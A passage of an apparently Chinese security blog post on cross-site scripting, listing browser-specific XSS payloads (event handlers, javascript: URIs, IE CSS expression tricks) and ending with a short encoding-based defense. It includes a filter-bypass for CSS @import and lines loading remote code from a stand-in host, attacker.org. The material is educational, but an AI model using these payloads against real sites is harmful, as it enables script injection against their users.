+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">textarea</span> <span style="color:#58a1dd">onfocus</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;);</span> <span style="color:#58a1dd">autofocus</span>&gt;</span></span></code></pre></div><p>####### <code>&lt;keygen&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">keygen</span> <span style="color:#58a1dd">autofocus</span> <span style="color:#58a1dd">onfocus</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(1)</span>&gt; //仅限火狐</span></span></code></pre></div><p>####### <code>&lt;marquee&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">marquee</span> <span style="color:#58a1dd">onstart</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;)</span>&gt;&lt;/<span style="color:#58a1dd">marquee</span>&gt; //Chrome不行，火狐和IE都可以</span></span></code></pre></div><p>####### <code>&lt;isindex&gt;</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">isindex</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">image</span> <span style="color:#58a1dd">src</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">1</span> <span style="color:#58a1dd">onerror</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">alert(&#34;xss&#34;)</span>&gt;//仅限于IE</span></span></code></pre></div><p>####### 利用link远程包含js文件</p>
+<p><strong>PS：在无CSP的情况下才可以</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">link</span> <span style="color:#58a1dd">rel</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">import</span> <span style="color:#58a1dd">href</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;http://127.0.0.1/1.js&#34;</span>&gt;</span></span></code></pre></div><p>####### javascript伪协议</p>
+<p><code>&lt;a&gt;标签</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">a</span> <span style="color:#58a1dd">href</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;javascript:alert(`xss`);&#34;</span>&gt;xss&lt;/<span style="color:#58a1dd">a</span>&gt;</span></span></code></pre></div><p><code>&lt;iframe&gt;标签</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">iframe</span> <span style="color:#58a1dd">src</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">javascript:alert(&#39;xss&#39;);</span>&gt;&lt;/<span style="color:#58a1dd">iframe</span>&gt;</span></span></code></pre></div><p><code>&lt;img&gt;标签</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">img</span> <span style="color:#58a1dd">src</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">javascript:alert(&#39;xss&#39;)</span>&gt;//IE7以下</span></span></code></pre></div><p><code>&lt;form&gt;</code>标签</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">form</span> <span style="color:#58a1dd">action</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;Javascript:alert(1)&#34;</span>&gt;&lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">submit</span>&gt;</span></span></code></pre></div><p>####### 其它</p>
+<p><code>expression属性</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">img</span> <span style="color:#58a1dd">style</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;xss:expression(alert(&#39;xss&#39;&#39;))&#34;</span>&gt; // IE7以下
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">div</span> <span style="color:#58a1dd">style</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;color:rgb(&#39;&#39;�x:expression(alert(1))&#34;</span>&gt;&lt;/<span style="color:#58a1dd">div</span>&gt; //IE7以下
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">style</span>&gt;#<span style="color:#58a1dd">test</span>{<span style="color:#58a1dd">x</span>:<span style="color:#58a1dd">expression</span>(<span style="color:#58a1dd">alert</span>(<span style="color:#ff636f">/</span><span style="color:#58a1dd">XSS</span><span style="color:#ff636f">/</span>))}&lt;/<span style="color:#58a1dd">style</span>&gt; // IE7以下</span></span></code></pre></div><p><code>background属性</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">table</span> <span style="color:#58a1dd">background</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">javascript:alert(1)</span>&gt;&lt;/<span style="color:#58a1dd">table</span>&gt; //在Opera 10.5和IE6上有效</span></span></code></pre></div><p><code>CSS import</code>
+IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">style</span>&gt;
+</span></span><span style="display:flex;"><span>@<span style="color:#ff636f">import</span> <span style="color:#58a1dd">url</span><span style="color:#ff636f">(</span><span style="color:#a6be9d">&#34;http://attacker.org/malicious.css&#34;</span><span style="color:#ff636f">)</span>;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">style</span>&gt;</span></span></code></pre></div><p>malicious.css：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#58a1dd">body</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">color</span>: <span style="color:#58a1dd">expression</span>(<span style="color:#58a1dd">alert</span>(<span style="color:#a6be9d">&#39;XSS&#39;</span>));
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">style</span>&gt;
+</span></span><span style="display:flex;"><span>@<span style="color:#ff636f">imp</span>\<span style="color:#58a1dd">ort</span> <span style="color:#58a1dd">url</span><span style="color:#ff636f">(</span><span style="color:#a6be9d">&#34;http://attacker.org/malicious.css&#34;</span><span style="color:#ff636f">)</span>;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">style</span>&gt;</span></span></code></pre></div><p>IE 浏览器会接受反斜杠，但是我们绕过了过滤器。</p>
+<h5 id="防护" class="heading-element"><span>0.0.0.3  防护</span>
+  <a href="#%e9%98%b2%e6%8a%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>####### XSS防护</p>
+<p>如果将以下符号实体编码，基本就会杜绝xss隐患</p>
+<p>&lt; &gt; &rsquo; &quot;</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/xss/" class="post-tag" title="Tags - XSS">XSS</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/owasp/xxe/127/" class="post-nav-item" rel="prev" title="XXE-基础"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>XXE-基础</a>
+      <a href="/posts/owasp/xss/124/" class="post-nav-item" rel="next" title="XSS-Js相关">XSS-Js相关<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
